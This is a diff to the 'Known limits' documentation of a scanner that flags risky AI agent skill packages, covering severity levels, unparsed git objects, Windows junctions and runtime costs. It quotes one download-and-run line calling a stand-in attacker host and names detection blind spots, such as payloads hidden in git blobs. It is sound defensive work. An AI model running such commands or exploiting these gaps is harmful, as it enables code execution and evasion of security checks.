@@ -1165,24 +1165,41 @@ see "Skill packages (STORY-0095)" below.
 SKILL-005..008 read every file in a skill folder (`docs/skill-packages.md`).
 Known limits, each measured or stated, not guessed:
 
-- **A plain `curl … | sh` is LOW, not MEDIUM.** On 1,128 ordinary skills
-  (2026-10-25), 9 lines pipe a third-party installer into a shell (LOW) and 12
-  more are vendor installers, Dockerfile lines or advice against the shape
-  (INFO). Raising the plain shape would put a MEDIUM on ordinary skills, so a
-  plain pipe from an unlisted host stays LOW; only the concealed shapes (TLS
-  off, decoded, plaintext, raw IP, decode-then-execute) are HIGH. A malicious
-  skill that pipes an ordinary-looking https installer is LOW.
+- **A plain `curl … | sh` is LOW, not MEDIUM.** On 1,129 ordinary skills
+  (corpus fetched 2026-10-25, re-measured 2026-10-27), 9 lines pipe or
+  download-and-run a third-party installer (LOW) and 12 more are vendor
+  installers, Dockerfile lines or advice against the shape (INFO). Raising
+  the plain shape would put a MEDIUM on ordinary skills, so a plain pipe from
+  an unlisted host stays LOW; only the concealed shapes (TLS off, decoded,
+  plaintext, raw IP, decode-then-execute) are HIGH. A malicious skill that
+  pipes an ordinary-looking https installer is LOW.
 - **The vendor-installer list is a list.** A compromised vendor-hosted script
   is INFO. The list (`install_steps.VENDOR_INSTALLERS`) needs maintenance as
   installers move.
 - **Archives are not unpacked**, and 7-Zip/RAR encryption is not checked (ZIP
   encryption is). Archives are reported as SKILL-007 LOW.
-- **Git objects are not parsed.** Files in `.git/` outside git's own layout are
-  SKILL-007 MEDIUM, but a payload committed as a real blob (loose or packed)
-  and extracted with `git show` at run time is not seen, and `git show … | sh`
-  is not an install-step shape.
+- **Git objects are not parsed.** Git's text records in `.git/` are read
+  (SKILL-005 sees a command in `COMMIT_EDITMSG` or `description`), and git's
+  binary files are checked only by their first bytes (zlib for a loose object,
+  `PACK`, `\377tOc`, `DIRC`, `CGPH` …). A payload committed as a real blob
+  (loose or packed, so the bytes really are git's) and extracted with `git
+  show` at run time is not seen, and `git show … | sh` is not an install-step
+  shape. Git LFS objects (`.git/lfs/objects/`) are the repository's own large
+  files of any type and are not checked.
 - **Dependency folders** (`node_modules`, `.venv`, `venv`, `site-packages`,
   `bower_components`) are not walked; each is reported as SKILL-007 LOW.
+- **Windows junctions and other reparse points.** Reads are refused when the
+  resolved path leaves the scan root (and the refusal is recorded in the
+  scan's `errors`), and `O_NOFOLLOW` stops a symlink swapped in after the
+  walk. Windows has no `O_NOFOLLOW`, and a directory junction is not a
+  symlink to `os.scandir`, so the walk may enter a junction inside a skill;
+  what it reaches is still read only when it resolves inside the scan root.
+  Not tested on Windows.
+- **Nested skills follow discovery.** A folder inside a skill that has its own
+  `SKILL.md` is analysed as its own skill only when skill discovery returns it
+  (same skip list, at most eight levels below the skills directory);
+  otherwise it is read as part of the enclosing skill, so an empty
+  `SKILL.md` in `__pycache__/` or `.tox/` hides nothing.
 - **Symlinked skill folders are followed one level only** (decision
   2026-10-26, Marcus `humans/decisions/2026-10-26-follow-symlinked-skill-folders.md`).
   A symlink directly under a skills directory that points at a skill is read
@@ -1215,17 +1232,24 @@ Known limits, each measured or stated, not guessed:
   --project` reports plugins under every `.claude/skills` in the tree, as it
   does for nested `.mcp.json` files.
 - **Context is not judged.** A skill that switches permission prompts off
-  inside a dev container it builds (trailofbits `devcontainer-setup`, the one
-  benign MEDIUM+ in the corpus) gets the same SKILL-006 HIGH as one that does it
-  on the host.
+  inside a dev container it builds (trailofbits `devcontainer-setup`) gets the
+  same SKILL-006 HIGH as one that does it on the host, and a security
+  reference that quotes an attack command (trailofbits
+  `agentic-actions-auditor`: `echo $(curl attacker.com/payload | sh)`) gets
+  the same SKILL-005 HIGH as an instruction to run it. These are the two
+  benign MEDIUM+ skills in the 1,129-skill corpus.
 - **Harness flags are matched case-sensitively** (`claude`, `codex`, `gemini`,
   `qwen`), so prose naming "Gemini CLI" does not fire; an invocation written
   `Claude --dangerously-skip-permissions` is not matched.
-- **Cost.** About 0.5 s per MiB of ordinary text and up to about 1.5 s per MiB of
-  text written to defeat the per-file pattern gates. Budgets (8 MiB per skill,
-  32 MiB per scan, 1 MiB of frontmatter YAML per scan) bound each pass over a
-  hostile repository to about a minute (`scan --project` makes two passes:
-  the working directory's skills and the tree's); anything past a budget is
+- **Cost.** Measured 2026-10-27 on a 2-core VM: about 20 ms of CPU per
+  ordinary skill (1,129 skills in about 22 s) and up to about 3 s per MiB of
+  text written to defeat the per-file pattern gates; the test suite requires
+  each such input of about 1 MiB to finish in under 6 s. Budgets (8 MiB per
+  skill, 32 MiB per scan, 1 MiB of frontmatter YAML per scan) bound each pass
+  over a hostile repository: `check` in a repository whose skills fill the
+  32 MiB budget with such text took 61 s (50 s CPU), and one 11 MiB hostile
+  skill, read to its 8 MiB budget, 15 s. `scan --project` makes two passes
+  (the working directory's skills and the tree's). Anything past a budget is
   reported.
 - **The opt-in sidecar pass drops filesystem errors.** The default pass over
   the same skills records them in `errors`.
